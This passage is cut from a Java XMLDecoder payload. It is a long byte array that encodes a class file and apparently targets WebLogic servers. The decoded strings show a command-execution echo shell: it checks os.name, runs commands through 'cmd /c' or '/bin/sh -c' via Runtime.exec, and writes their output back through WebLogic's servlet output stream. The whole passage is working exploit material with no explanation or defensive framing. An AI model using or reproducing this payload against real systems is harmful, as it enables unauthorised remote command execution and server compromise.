index=\"2203\"><byte>0</byte></void><void index=\"2204\"><byte>35</byte></void><void index=\"2205\"><byte>119</byte></void><void index=\"2206\"><byte>101</byte></void><void index=\"2207\"><byte>98</byte></void><void index=\"2208\"><byte>108</byte></void><void index=\"2209\"><byte>111</byte></void><void index=\"2210\"><byte>103</byte></void><void index=\"2211\"><byte>105</byte></void><void index=\"2212\"><byte>99</byte></void><void index=\"2213\"><byte>47</byte></void><void index=\"2214\"><byte>120</byte></void><void index=\"2215\"><byte>109</byte></void><void index=\"2216\"><byte>108</byte></void><void index=\"2217\"><byte>47</byte></void><void index=\"2218\"><byte>117</byte></void><void index=\"2219\"><byte>116</byte></void><void index=\"2220\"><byte>105</byte></void><void index=\"2221\"><byte>108</byte></void><void index=\"2222\"><byte>47</byte></void><void index=\"2223\"><byte>83</byte></void><void index=\"2224\"><byte>116</byte></void><void index=\"2225\"><byte>114</byte></void><void index=\"2226\"><byte>105</byte></void><void index=\"2227\"><byte>110</byte></void><void index=\"2228\"><byte>103</byte></void><void index=\"2229\"><byte>73</byte></void><void index=\"2230\"><byte>110</byte></void><void index=\"2231\"><byte>112</byte></void><void index=\"2232\"><byte>117</byte></void><void index=\"2233\"><byte>116</byte></void><void index=\"2234\"><byte>83</byte></void><void index=\"2235\"><byte>116</byte></void><void index=\"2236\"><byte>114</byte></void><void index=\"2237\"><byte>101</byte></void><void index=\"2238\"><byte>97</byte></void><void index=\"2239\"><byte>109</byte></void><void index=\"2240\"><byte>7</byte></void><void index=\"2241\"><byte>0</byte></void><void index=\"2242\"><byte>78</byte></void><void index=\"2243\"><byte>1</byte></void><void index=\"2244\"><byte>0</byte></void><void index=\"2245\"><byte>22</byte></void><void index=\"2246\"><byte>106</byte></void><void index=\"2247\"><byte>97</byte></void><void index=\"2248\"><byte>118</byte></void><void index=\"2249\"><byte>97</byte></void><void index=\"2250\"><byte>47</byte></void><void index=\"2251\"><byte>108</byte></void><void index=\"2252\"><byte>97</byte></void><void index=\"2253\"><byte>110</byte></void><void index=\"2254\"><byte>103</byte></void><void index=\"2255\"><byte>47</byte></void><void index=\"2256\"><byte>83</byte></void><void index=\"2257\"><byte>116</byte></void><void index=\"2258\"><byte>114</byte></void><void index=\"2259\"><byte>105</byte></void><void index=\"2260\"><byte>110</byte></void><void index=\"2261\"><byte>103</byte></void><void index=\"2262\"><byte>66</byte></void><void index=\"2263\"><byte>117</byte></void><void index=\"2264\"><byte>102</byte></void><void index=\"2265\"><byte>102</byte></void><void index=\"2266\"><byte>101</byte></void><void index=\"2267\"><byte>114</byte></void><void index=\"2268\"><byte>7</byte></void><void index=\"2269\"><byte>0</byte></void><void index=\"2270\"><byte>80</byte></void><void index=\"2271\"><byte>10</byte></void><void index=\"2272\"><byte>0</byte></void><void index=\"2273\"><byte>81</byte></void><void index=\"2274\"><byte>0</byte></void><void index=\"2275\"><byte>34</byte></void><void index=\"2276\"><byte>1</byte></void><void index=\"2277\"><byte>0</byte></void><void index=\"2278\"><byte>6</byte></void><void index=\"2279\"><byte>97</byte></void><void index=\"2280\"><byte>112</byte></void><void index=\"2281\"><byte>112</byte></void><void index=\"2282\"><byte>101</byte></void><void index=\"2283\"><byte>110</byte></void><void index=\"2284\"><byte>100</byte></void><void index=\"2285\"><byte>1</byte></void><void index=\"2286\"><byte>0</byte></void><void index=\"2287\"><byte>44</byte></void><void index=\"2288\"><byte>40</byte></void><void index=\"2289\"><byte>76</byte></void><void index=\"2290\"><byte>106</byte></void><void index=\"2291\"><byte>97</byte></void><void index=\"2292\"><byte>118</byte></void><void index=\"2293\"><byte>97</byte></void><void index=\"2294\"><byte>47</byte></void><void index=\"2295\"><byte>108</byte></void><void index=\"2296\"><byte>97</byte></void><void index=\"2297\"><byte>110</byte></void><void index=\"2298\"><byte>103</byte></void><void index=\"2299\"><byte>47</byte></void><void index=\"2300\"><byte>83</byte></void><void index=\"2301\"><byte>116</byte></void><void index=\"2302\"><byte>114</byte></void><void index=\"2303\"><byte>105</byte></void><void index=\"2304\"><byte>110</byte></void><void index=\"2305\"><byte>103</byte></void><void index=\"2306\"><byte>59</byte></void><void index=\"2307\"><byte>41</byte></void><void index=\"2308\"><byte>76</byte></void><void index=\"2309\"><byte>106</byte></void><void index=\"2310\"><byte>97</byte></void><void index=\"2311\"><byte>118</byte></void><void index=\"2312\"><byte>97</byte></void><void index=\"2313\"><byte>47</byte></void><void index=\"2314\"><byte>108</byte></void><void index=\"2315\"><byte>97</byte></void><void index=\"2316\"><byte>110</byte></void><void index=\"2317\"><byte>103</byte></void><void index=\"2318\"><byte>47</byte></void><void index=\"2319\"><byte>83</byte></void><void index=\"2320\"><byte>116</byte></void><void index=\"2321\"><byte>114</byte></void><void index=\"2322\"><byte>105</byte></void><void index=\"2323\"><byte>110</byte></void><void index=\"2324\"><byte>103</byte></void><void index=\"2325\"><byte>66</byte></void><void index=\"2326\"><byte>117</byte></void><void index=\"2327\"><byte>102</byte></void><void index=\"2328\"><byte>102</byte></void><void index=\"2329\"><byte>101</byte></void><void index=\"2330\"><byte>114</byte></void><void index=\"2331\"><byte>59</byte></void><void index=\"2332\"><byte>12</byte></void><void index=\"2333\"><byte>0</byte></void><void index=\"2334\"><byte>83</byte></void><void index=\"2335\"><byte>0</byte></void><void index=\"2336\"><byte>84</byte></void><void index=\"2337\"><byte>10</byte></void><void index=\"2338\"><byte>0</byte></void><void index=\"2339\"><byte>81</byte></void><void index=\"2340\"><byte>0</byte></void><void index=\"2341\"><byte>85</byte></void><void index=\"2342\"><byte>1</byte></void><void index=\"2343\"><byte>0</byte></void><void index=\"2344\"><byte>5</byte></void><void index=\"2345\"><byte>32</byte></void><void index=\"2346\"><byte>58</byte></void><void index=\"2347\"><byte>32</byte></void><void index=\"2348\"><byte>13</byte></void><void index=\"2349\"><byte>10</byte></void><void index=\"2350\"><byte>8</byte></void><void index=\"2351\"><byte>0</byte></void><void index=\"2352\"><byte>87</byte></void><void index=\"2353\"><byte>1</byte></void><void index=\"2354\"><byte>0</byte></void><void index=\"2355\"><byte>8</byte></void><void index=\"2356\"><byte>116</byte></void><void index=\"2357\"><byte>111</byte></void><void index=\"2358\"><byte>83</byte></void><void index=\"2359\"><byte>116</byte></void><void index=\"2360\"><byte>114</byte></void><void index=\"2361\"><byte>105</byte></void><void index=\"2362\"><byte>110</byte></void><void index=\"2363\"><byte>103</byte></void><void index=\"2364\"><byte>1</byte></void><void index=\"2365\"><byte>0</byte></void><void index=\"2366\"><byte>20</byte></void><void index=\"2367\"><byte>40</byte></void><void index=\"2368\"><byte>41</byte></void><void index=\"2369\"><byte>76</byte></void><void index=\"2370\"><byte>106</byte></void><void index=\"2371\"><byte>97</byte></void><void index=\"2372\"><byte>118</byte></void><void index=\"2373\"><byte>97</byte></void><void index=\"2374\"><byte>47</byte></void><void index=\"2375\"><byte>108</byte></void><void index=\"2376\"><byte>97</byte></void><void index=\"2377\"><byte>110</byte></void><void index=\"2378\"><byte>103</byte></void><void index=\"2379\"><byte>47</byte></void><void index=\"2380\"><byte>83</byte></void><void index=\"2381\"><byte>116</byte></void><void index=\"2382\"><byte>114</byte></void><void index=\"2383\"><byte>105</byte></void><void index=\"2384\"><byte>110</byte></void><void index=\"2385\"><byte>103</byte></void><void index=\"2386\"><byte>59</byte></void><void index=\"2387\"><byte>12</byte></void><void index=\"2388\"><byte>0</byte></void><void index=\"2389\"><byte>89</byte></void><void index=\"2390\"><byte>0</byte></void><void index=\"2391\"><byte>90</byte></void><void index=\"2392\"><byte>10</byte></void><void index=\"2393\"><byte>0</byte></void><void index=\"2394\"><byte>81</byte></void><void index=\"2395\"><byte>0</byte></void><void index=\"2396\"><byte>91</byte></void><void index=\"2397\"><byte>12</byte></void><void index=\"2398\"><byte>0</byte></void><void index=\"2399\"><byte>10</byte></void><void index=\"2400\"><byte>0</byte></void><void index=\"2401\"><byte>71</byte></void><void index=\"2402\"><byte>10</byte></void><void index=\"2403\"><byte>0</byte></void><void index=\"2404\"><byte>79</byte></void><void index=\"2405\"><byte>0</byte></void><void index=\"2406\"><byte>93</byte></void><void index=\"2407\"><byte>1</byte></void><void index=\"2408\"><byte>0</byte></void><void index=\"2409\"><byte>49</byte></void><void index=\"2410\"><byte>119</byte></void><void index=\"2411\"><byte>101</byte></void><void index=\"2412\"><byte>98</byte></void><void index=\"2413\"><byte>108</byte></void><void index=\"2414\"><byte>111</byte></void><void index=\"2415\"><byte>103</byte></void><void index=\"2416\"><byte>105</byte></void><void index=\"2417\"><byte>99</byte></void><void index=\"2418\"><byte>47</byte></void><void index=\"2419\"><byte>115</byte></void><void index=\"2420\"><byte>101</byte></void><void index=\"2421\"><byte>114</byte></void><void index=\"2422\"><byte>118</byte></void><void index=\"2423\"><byte>108</byte></void><void index=\"2424\"><byte>101</byte></void><void index=\"2425\"><byte>116</byte></void><void index=\"2426\"><byte>47</byte></void><void index=\"2427\"><byte>105</byte></void><void index=\"2428\"><byte>110</byte></void><void index=\"2429\"><byte>116</byte></void><void index=\"2430\"><byte>101</byte></void><void index=\"2431\"><byte>114</byte></void><void index=\"2432\"><byte>110</byte></void><void index=\"2433\"><byte>97</byte></void><void index=\"2434\"><byte>108</byte></void><void index=\"2435\"><byte>47</byte></void><void index=\"2436\"><byte>83</byte></void><void index=\"2437\"><byte>101</byte></void><void index=\"2438\"><byte>114</byte></void><void index=\"2439\"><byte>118</byte></void><void index=\"2440\"><byte>108</byte></void><void index=\"2441\"><byte>101</byte></void><void index=\"2442\"><byte>116</byte></void><void index=\"2443\"><byte>79</byte></void><void index=\"2444\"><byte>117</byte></void><void index=\"2445\"><byte>116</byte></void><void index=\"2446\"><byte>112</byte></void><void index=\"2447\"><byte>117</byte></void><void index=\"2448\"><byte>116</byte></void><void index=\"2449\"><byte>83</byte></void><void index=\"2450\"><byte>116</byte></void><void index=\"2451\"><byte>114</byte></void><void index=\"2452\"><byte>101</byte></void><void index=\"2453\"><byte>97</byte></void><void index=\"2454\"><byte>109</byte></void><void index=\"2455\"><byte>73</byte></void><void index=\"2456\"><byte>109</byte></void><void index=\"2457\"><byte>112</byte></void><void index=\"2458\"><byte>108</byte></void><void index=\"2459\"><byte>7</byte></void><void index=\"2460\"><byte>0</byte></void><void index=\"2461\"><byte>95</byte></void><void index=\"2462\"><byte>1</byte></void><void index=\"2463\"><byte>0</byte></void><void index=\"2464\"><byte>11</byte></void><void index=\"2465\"><byte>119</byte></void><void index=\"2466\"><byte>114</byte></void><void index=\"2467\"><byte>105</byte></void><void index=\"2468\"><byte>116</byte></void><void index=\"2469\"><byte>101</byte></void><void index=\"2470\"><byte>83</byte></void><void index=\"2471\"><byte>116</byte></void><void index=\"2472\"><byte>114</byte></void><void index=\"2473\"><byte>101</byte></void><void index=\"2474\"><byte>97</byte></void><void index=\"2475\"><byte>109</byte></void><void index=\"2476\"><byte>1</byte></void><void index=\"2477\"><byte>0</byte></void><void index=\"2478\"><byte>24</byte></void><void index=\"2479\"><byte>40</byte></void><void index=\"2480\"><byte>76</byte></void><void index=\"2481\"><byte>106</byte></void><void index=\"2482\"><byte>97</byte></void><void index=\"2483\"><byte>118</byte></void><void index=\"2484\"><byte>97</byte></void><void index=\"2485\"><byte>47</byte></void><void index=\"2486\"><byte>105</byte></void><void index=\"2487\"><byte>111</byte></void><void index=\"2488\"><byte>47</byte></void><void index=\"2489\"><byte>73</byte></void><void index=\"2490\"><byte>110</byte></void><void index=\"2491\"><byte>112</byte></void><void index=\"2492\"><byte>117</byte></void><void index=\"2493\"><byte>116</byte></void><void index=\"2494\"><byte>83</byte></void><void index=\"2495\"><byte>116</byte></void><void index=\"2496\"><byte>114</byte></void><void index=\"2497\"><byte>101</byte></void><void index=\"2498\"><byte>97</byte></void><void index=\"2499\"><byte>109</byte></void><void index=\"2500\"><byte>59</byte></void><void index=\"2501\"><byte>41</byte></void><void index=\"2502\"><byte>86</byte></void><void index=\"2503\"><byte>12</byte></void><void index=\"2504\"><byte>0</byte></void><void index=\"2505\"><byte>97</byte></void><void index=\"2506\"><byte>0</byte></void><void index=\"2507\"><byte>98</byte></void><void index=\"2508\"><byte>10</byte></void><void index=\"2509\"><byte>0</byte></void><void index=\"2510\"><byte>96</byte></void><void index=\"2511\"><byte>0</byte></void><void index=\"2512\"><byte>99</byte></void><void index=\"2513\"><byte>1</byte></void><void index=\"2514\"><byte>0</byte></void><void index=\"2515\"><byte>5</byte></void><void index=\"2516\"><byte>102</byte></void><void index=\"2517\"><byte>108</byte></void><void index=\"2518\"><byte>117</byte></void><void index=\"2519\"><byte>115</byte></void><void index=\"2520\"><byte>104</byte></void><void index=\"2521\"><byte>12</byte></void><void index=\"2522\"><byte>0</byte></void><void index=\"2523\"><byte>101</byte></void><void index=\"2524\"><byte>0</byte></void><void index=\"2525\"><byte>11</byte></void><void index=\"2526\"><byte>10</byte></void><void index=\"2527\"><byte>0</byte></void><void index=\"2528\"><byte>96</byte></void><void index=\"2529\"><byte>0</byte></void><void index=\"2530\"><byte>102</byte></void><void index=\"2531\"><byte>1</byte></void><void index=\"2532\"><byte>0</byte></void><void index=\"2533\"><byte>7</byte></void><void index=\"2534\"><byte>111</byte></void><void index=\"2535\"><byte>115</byte></void><void index=\"2536\"><byte>46</byte></void><void index=\"2537\"><byte>110</byte></void><void index=\"2538\"><byte>97</byte></void><void index=\"2539\"><byte>109</byte></void><void index=\"2540\"><byte>101</byte></void><void index=\"2541\"><byte>8</byte></void><void index=\"2542\"><byte>0</byte></void><void index=\"2543\"><byte>104</byte></void><void index=\"2544\"><byte>1</byte></void><void index=\"2545\"><byte>0</byte></void><void index=\"2546\"><byte>16</byte></void><void index=\"2547\"><byte>106</byte></void><void index=\"2548\"><byte>97</byte></void><void index=\"2549\"><byte>118</byte></void><void index=\"2550\"><byte>97</byte></void><void index=\"2551\"><byte>47</byte></void><void index=\"2552\"><byte>108</byte></void><void index=\"2553\"><byte>97</byte></void><void index=\"2554\"><byte>110</byte></void><void index=\"2555\"><byte>103</byte></void><void index=\"2556\"><byte>47</byte></void><void index=\"2557\"><byte>83</byte></void><void index=\"2558\"><byte>121</byte></void><void index=\"2559\"><byte>115</byte></void><void index=\"2560\"><byte>116</byte></void><void index=\"2561\"><byte>101</byte></void><void index=\"2562\"><byte>109</byte></void><void index=\"2563\"><byte>7</byte></void><void index=\"2564\"><byte>0</byte></void><void index=\"2565\"><byte>106</byte></void><void index=\"2566\"><byte>1</byte></void><void index=\"2567\"><byte>0</byte></void><void index=\"2568\"><byte>11</byte></void><void index=\"2569\"><byte>103</byte></void><void index=\"2570\"><byte>101</byte></void><void index=\"2571\"><byte>116</byte></void><void index=\"2572\"><byte>80</byte></void><void index=\"2573\"><byte>114</byte></void><void index=\"2574\"><byte>111</byte></void><void index=\"2575\"><byte>112</byte></void><void index=\"2576\"><byte>101</byte></void><void index=\"2577\"><byte>114</byte></void><void index=\"2578\"><byte>116</byte></void><void index=\"2579\"><byte>121</byte></void><void index=\"2580\"><byte>12</byte></void><void index=\"2581\"><byte>0</byte></void><void index=\"2582\"><byte>108</byte></void><void index=\"2583\"><byte>0</byte></void><void index=\"2584\"><byte>59</byte></void><void index=\"2585\"><byte>10</byte></void><void index=\"2586\"><byte>0</byte></void><void index=\"2587\"><byte>107</byte></void><void index=\"2588\"><byte>0</byte></void><void index=\"2589\"><byte>109</byte></void><void index=\"2590\"><byte>1</byte></void><void index=\"2591\"><byte>0</byte></void><void index=\"2592\"><byte>16</byte></void><void index=\"2593\"><byte>106</byte></void><void index=\"2594\"><byte>97</byte></void><void index=\"2595\"><byte>118</byte></void><void index=\"2596\"><byte>97</byte></void><void index=\"2597\"><byte>47</byte></void><void index=\"2598\"><byte>108</byte></void><void index=\"2599\"><byte>97</byte></void><void index=\"2600\"><byte>110</byte></void><void index=\"2601\"><byte>103</byte></void><void index=\"2602\"><byte>47</byte></void><void index=\"2603\"><byte>83</byte></void><void index=\"2604\"><byte>116</byte></void><void index=\"2605\"><byte>114</byte></void><void index=\"2606\"><byte>105</byte></void><void index=\"2607\"><byte>110</byte></void><void index=\"2608\"><byte>103</byte></void><void index=\"2609\"><byte>7</byte></void><void index=\"2610\"><byte>0</byte></void><void index=\"2611\"><byte>111</byte></void><void index=\"2612\"><byte>1</byte></void><void index=\"2613\"><byte>0</byte></void><void index=\"2614\"><byte>11</byte></void><void index=\"2615\"><byte>116</byte></void><void index=\"2616\"><byte>111</byte></void><void index=\"2617\"><byte>76</byte></void><void index=\"2618\"><byte>111</byte></void><void index=\"2619\"><byte>119</byte></void><void index=\"2620\"><byte>101</byte></void><void index=\"2621\"><byte>114</byte></void><void index=\"2622\"><byte>67</byte></void><void index=\"2623\"><byte>97</byte></void><void index=\"2624\"><byte>115</byte></void><void index=\"2625\"><byte>101</byte></void><void index=\"2626\"><byte>12</byte></void><void index=\"2627\"><byte>0</byte></void><void index=\"2628\"><byte>113</byte></void><void index=\"2629\"><byte>0</byte></void><void index=\"2630\"><byte>90</byte></void><void index=\"2631\"><byte>10</byte></void><void index=\"2632\"><byte>0</byte></void><void index=\"2633\"><byte>112</byte></void><void index=\"2634\"><byte>0</byte></void><void index=\"2635\"><byte>114</byte></void><void index=\"2636\"><byte>1</byte></void><void index=\"2637\"><byte>0</byte></void><void index=\"2638\"><byte>3</byte></void><void index=\"2639\"><byte>119</byte></void><void index=\"2640\"><byte>105</byte></void><void index=\"2641\"><byte>110</byte></void><void index=\"2642\"><byte>8</byte></void><void index=\"2643\"><byte>0</byte></void><void index=\"2644\"><byte>116</byte></void><void index=\"2645\"><byte>1</byte></void><void index=\"2646\"><byte>0</byte></void><void index=\"2647\"><byte>8</byte></void><void index=\"2648\"><byte>99</byte></void><void index=\"2649\"><byte>111</byte></void><void index=\"2650\"><byte>110</byte></void><void index=\"2651\"><byte>116</byte></void><void index=\"2652\"><byte>97</byte></void><void index=\"2653\"><byte>105</byte></void><void index=\"2654\"><byte>110</byte></void><void index=\"2655\"><byte>115</byte></void><void index=\"2656\"><byte>1</byte></void><void index=\"2657\"><byte>0</byte></void><void index=\"2658\"><byte>27</byte></void><void index=\"2659\"><byte>40</byte></void><void index=\"2660\"><byte>76</byte></void><void index=\"2661\"><byte>106</byte></void><void index=\"2662\"><byte>97</byte></void><void index=\"2663\"><byte>118</byte></void><void index=\"2664\"><byte>97</byte></void><void index=\"2665\"><byte>47</byte></void><void index=\"2666\"><byte>108</byte></void><void index=\"2667\"><byte>97</byte></void><void index=\"2668\"><byte>110</byte></void><void index=\"2669\"><byte>103</byte></void><void index=\"2670\"><byte>47</byte></void><void index=\"2671\"><byte>67</byte></void><void index=\"2672\"><byte>104</byte></void><void index=\"2673\"><byte>97</byte></void><void index=\"2674\"><byte>114</byte></void><void index=\"2675\"><byte>83</byte></void><void index=\"2676\"><byte>101</byte></void><void index=\"2677\"><byte>113</byte></void><void index=\"2678\"><byte>117</byte></void><void index=\"2679\"><byte>101</byte></void><void index=\"2680\"><byte>110</byte></void><void index=\"2681\"><byte>99</byte></void><void index=\"2682\"><byte>101</byte></void><void index=\"2683\"><byte>59</byte></void><void index=\"2684\"><byte>41</byte></void><void index=\"2685\"><byte>90</byte></void><void index=\"2686\"><byte>12</byte></void><void index=\"2687\"><byte>0</byte></void><void index=\"2688\"><byte>118</byte></void><void index=\"2689\"><byte>0</byte></void><void index=\"2690\"><byte>119</byte></void><void index=\"2691\"><byte>10</byte></void><void index=\"2692\"><byte>0</byte></void><void index=\"2693\"><byte>112</byte></void><void index=\"2694\"><byte>0</byte></void><void index=\"2695\"><byte>120</byte></void><void index=\"2696\"><byte>1</byte></void><void index=\"2697\"><byte>0</byte></void><void index=\"2698\"><byte>17</byte></void><void index=\"2699\"><byte>106</byte></void><void index=\"2700\"><byte>97</byte></void><void index=\"2701\"><byte>118</byte></void><void index=\"2702\"><byte>97</byte></void><void index=\"2703\"><byte>47</byte></void><void index=\"2704\"><byte>108</byte></void><void index=\"2705\"><byte>97</byte></void><void index=\"2706\"><byte>110</byte></void><void index=\"2707\"><byte>103</byte></void><void index=\"2708\"><byte>47</byte></void><void index=\"2709\"><byte>82</byte></void><void index=\"2710\"><byte>117</byte></void><void index=\"2711\"><byte>110</byte></void><void index=\"2712\"><byte>116</byte></void><void index=\"2713\"><byte>105</byte></void><void index=\"2714\"><byte>109</byte></void><void index=\"2715\"><byte>101</byte></void><void index=\"2716\"><byte>7</byte></void><void index=\"2717\"><byte>0</byte></void><void index=\"2718\"><byte>122</byte></void><void index=\"2719\"><byte>1</byte></void><void index=\"2720\"><byte>0</byte></void><void index=\"2721\"><byte>10</byte></void><void index=\"2722\"><byte>103</byte></void><void index=\"2723\"><byte>101</byte></void><void index=\"2724\"><byte>116</byte></void><void index=\"2725\"><byte>82</byte></void><void index=\"2726\"><byte>117</byte></void><void index=\"2727\"><byte>110</byte></void><void index=\"2728\"><byte>116</byte></void><void index=\"2729\"><byte>105</byte></void><void index=\"2730\"><byte>109</byte></void><void index=\"2731\"><byte>101</byte></void><void index=\"2732\"><byte>1</byte></void><void index=\"2733\"><byte>0</byte></void><void index=\"2734\"><byte>21</byte></void><void index=\"2735\"><byte>40</byte></void><void index=\"2736\"><byte>41</byte></void><void index=\"2737\"><byte>76</byte></void><void index=\"2738\"><byte>106</byte></void><void index=\"2739\"><byte>97</byte></void><void index=\"2740\"><byte>118</byte></void><void index=\"2741\"><byte>97</byte></void><void index=\"2742\"><byte>47</byte></void><void index=\"2743\"><byte>108</byte></void><void index=\"2744\"><byte>97</byte></void><void index=\"2745\"><byte>110</byte></void><void index=\"2746\"><byte>103</byte></void><void index=\"2747\"><byte>47</byte></void><void index=\"2748\"><byte>82</byte></void><void index=\"2749\"><byte>117</byte></void><void index=\"2750\"><byte>110</byte></void><void index=\"2751\"><byte>116</byte></void><void index=\"2752\"><byte>105</byte></void><void index=\"2753\"><byte>109</byte></void><void index=\"2754\"><byte>101</byte></void><void index=\"2755\"><byte>59</byte></void><void index=\"2756\"><byte>12</byte></void><void index=\"2757\"><byte>0</byte></void><void index=\"2758\"><byte>124</byte></void><void index=\"2759\"><byte>0</byte></void><void index=\"2760\"><byte>125</byte></void><void index=\"2761\"><byte>10</byte></void><void index=\"2762\"><byte>0</byte></void><void index=\"2763\"><byte>123</byte></void><void index=\"2764\"><byte>0</byte></void><void index=\"2765\"><byte>126</byte></void><void index=\"2766\"><byte>1</byte></void><void index=\"2767\"><byte>0</byte></void><void index=\"2768\"><byte>7</byte></void><void index=\"2769\"><byte>99</byte></void><void index=\"2770\"><byte>109</byte></void><void index=\"2771\"><byte>100</byte></void><void index=\"2772\"><byte>32</byte></void><void index=\"2773\"><byte>47</byte></void><void index=\"2774\"><byte>99</byte></void><void index=\"2775\"><byte>32</byte></void><void index=\"2776\"><byte>8</byte></void><void index=\"2777\"><byte>0</byte></void><void index=\"2778\"><byte>-128</byte></void><void index=\"2779\"><byte>1</byte></void><void index=\"2780\"><byte>0</byte></void><void index=\"2781\"><byte>4</byte></void><void index=\"2782\"><byte>101</byte></void><void index=\"2783\"><byte>120</byte></void><void index=\"2784\"><byte>101</byte></void><void index=\"2785\"><byte>99</byte></void><void index=\"2786\"><byte>1</byte></void><void index=\"2787\"><byte>0</byte></void><void index=\"2788\"><byte>39</byte></void><void index=\"2789\"><byte>40</byte></void><void index=\"2790\"><byte>76</byte></void><void index=\"2791\"><byte>106</byte></void><void index=\"2792\"><byte>97</byte></void><void index=\"2793\"><byte>118</byte></void><void index=\"2794\"><byte>97</byte></void><void index=\"2795\"><byte>47</byte></void><void index=\"2796\"><byte>108</byte></void><void index=\"2797\"><byte>97</byte></void><void index=\"2798\"><byte>110</byte></void><void index=\"2799\"><byte>103</byte></void><void index=\"2800\"><byte>47</byte></void><void index=\"2801\"><byte>83</byte></void><void index=\"2802\"><byte>116</byte></void><void index=\"2803\"><byte>114</byte></void><void index=\"2804\"><byte>105</byte></void><void index=\"2805\"><byte>110</byte></void><void index=\"2806\"><byte>103</byte></void><void index=\"2807\"><byte>59</byte></void><void index=\"2808\"><byte>41</byte></void><void index=\"2809\"><byte>76</byte></void><void index=\"2810\"><byte>106</byte></void><void index=\"2811\"><byte>97</byte></void><void index=\"2812\"><byte>118</byte></void><void index=\"2813\"><byte>97</byte></void><void index=\"2814\"><byte>47</byte></void><void index=\"2815\"><byte>108</byte></void><void index=\"2816\"><byte>97</byte></void><void index=\"2817\"><byte>110</byte></void><void index=\"2818\"><byte>103</byte></void><void index=\"2819\"><byte>47</byte></void><void index=\"2820\"><byte>80</byte></void><void index=\"2821\"><byte>114</byte></void><void index=\"2822\"><byte>111</byte></void><void index=\"2823\"><byte>99</byte></void><void index=\"2824\"><byte>101</byte></void><void index=\"2825\"><byte>115</byte></void><void index=\"2826\"><byte>115</byte></void><void index=\"2827\"><byte>59</byte></void><void index=\"2828\"><byte>12</byte></void><void index=\"2829\"><byte>0</byte></void><void index=\"2830\"><byte>-126</byte></void><void index=\"2831\"><byte>0</byte></void><void index=\"2832\"><byte>-125</byte></void><void index=\"2833\"><byte>10</byte></void><void index=\"2834\"><byte>0</byte></void><void index=\"2835\"><byte>123</byte></void><void index=\"2836\"><byte>0</byte></void><void index=\"2837\"><byte>-124</byte></void><void index=\"2838\"><byte>1</byte></void><void index=\"2839\"><byte>0</byte></void><void index=\"2840\"><byte>11</byte></void><void index=\"2841\"><byte>47</byte></void><void index=\"2842\"><byte>98</byte></void><void index=\"2843\"><byte>105</byte></void><void index=\"2844\"><byte>110</byte></void><void index=\"2845\"><byte>47</byte></void><void index=\"2846\"><byte>115</byte></void><void index=\"2847\"><byte>104</byte></void><void index=\"2848\"><byte>32</byte></void><void index=\"2849\"><byte>45</byte></void><void index=\"2850\"><byte>99</byte></void><void index=\"2851\"><byte>32</byte></void><void index=\"2852\"><byte>8</byte></void><void index=\"2853\"><byte>0</byte></void><void index=\"2854\"><byte>-122</byte></void><void index=\"2855\"><byte>1</byte></void><void index=\"2856\"><byte>0</byte></void><void index=\"2857\"><byte>22</byte></void><void index=\"2858\"><byte>106</byte></void><void index=\"2859\"><byte>97</byte></void><void index=\"2860\"><byte>118</byte></void><void index=\"2861\"><byte>97</byte></void><void index=\"2862\"><byte>47</byte></void><void index=\"2863\"><byte>105</byte></void><void index=\"2864\"><byte>111</byte></void><void index=\"2865\"><byte>47</byte></void><void index=\"2866\"><byte>66</byte></void><void index=\"2867\"><byte>117</byte></void><void index=\"2868\"><byte>102</byte></void><void index=\"2869\"><byte>102</byte></void><void index=\"2870\"><byte>101</byte></void><void index=\"2871\"><byte>114</byte></void><void index=\"2872\"><byte>101</byte></void><void index=\"2873\"><byte>100</byte></void><void index=\"2874\"><byte>82</byte></void><void index=\"2875\"><byte>101</byte></void><void index=\"2876\"><byte>97</byte></void><void index=\"2877\"><byte>100</byte></void><void index=\"2878\"><byte>101</byte></void><void index=\"2879\"><byte>114</byte></void><void index=\"2880\"><byte>7</byte></void><void index=\"2881\"><byte>0</byte></void><void index=\"2882\"><byte>-120</byte></void><void index=\"2883\"><byte>1</byte></void><void index=\"2884\"><byte>0</byte></void><void index=\"2885\"><byte>25</byte></void><void index=\"2886\"><byte>106</byte></void><void index=\"2887\"><byte>97</byte></void><void index=\"2888\"><byte>118</byte></void><void index=\"2889\"><byte>97</byte></void><void index=\"2890\"><byte>47</byte></void><void index=\"2891\"><byte>105</byte></void><void index=\"2892\"><byte>111</byte></void><void index=\"2893\"><byte>47</byte></void><void index=\"2894\"><byte>73</byte></void><void index=\"2895\"><byte>110</byte></void><void index=\"2896\"><byte>112</byte></void><void index=\"2897\"><byte>117</byte></void><void index=\"2898\"><byte>116</byte></void><void index=\"2899\"><byte>83</byte></void><void index=\"2900\"><byte>116</byte></void><void index=\"2901\"><byte>114</byte></void><void index=\"2902\"><byte>101</byte></void><void index=\"2903\"><byte>97</byte></void><void index=\"2904\"><byte>109</byte></void><void index=\"2905\"><byte>82</byte></void><void index=\"2906\"><byte>101</byte></void><void index=\"2907\"><byte>97</byte></void><void index=\"2908\"><byte>100</byte></void><void index=\"2909\"><byte>101</byte></void><void index=\"2910\"><byte>114</byte></void><void index=\"2911\"><byte>7</byte></void><void index=\"2912\"><byte>0</byte></void><void index=\"2913\"><byte>-118</byte></void><void index=\"2914\"><byte>1</byte></void><void index=\"2915\"><byte>0</byte></void><void index=\"2916\"><byte>17</byte></void><void index=\"2917\"><byte>106</byte></void><void index=\"2918\"><byte>97</byte></void><void index=\"2919\"><byte>118</byte></void><void index=\"2920\"><byte>97</byte></void><void index=\"2921\"><byte>47</byte></void><void index=\"2922\"><byte>108</byte></void><void index=\"2923\"><byte>97</byte></void><void index=\"2924\"><byte>110</byte></void><void index=\"2925\"><byte>103</byte></void><void index=\"2926\"><byte>47</byte></void><void index=\"2927\"><byte>80</byte></void><void index=\"2928\"><byte>114</byte></void><void index=\"2929\"><byte>111</byte></void><void index=\"2930\"><byte>99</byte></void><void index=\"2931\"><byte>101</byte></void><void index=\"2932\"><byte>115</byte></void><void index=\"2933\"><byte>115</byte></void><void index=\"2934\"><byte>7</byte></void><void index=\"2935\"><byte>0</byte></void><void index=\"2936\"><byte>-116</byte></void><void index=\"2937\"><byte>1</byte></void><void index=\"2938\"><byte>0</byte></void><void index=\"2939\"><byte>14</byte></void><void index=\"2940\"><byte>103</byte></void><void index=\"2941\"><byte>101</byte></void><void index=\"2942\"><byte>116</byte></void><void index=\"2943\"><byte>73</byte></void><void index=\"2944\"><byte>110</byte></void><void index=\"2945\"><byte>112</byte></void><void index=\"2946\"><byte>117</byte></void><void index=\"2947\"><byte>116</byte></void><void index=\"2948\"><byte>83</byte></void><void index=\"2949\"><byte>116</byte></void><void index=\"2950\"><byte>114</byte></void><void index=\"2951\"><byte>101</byte></void><void 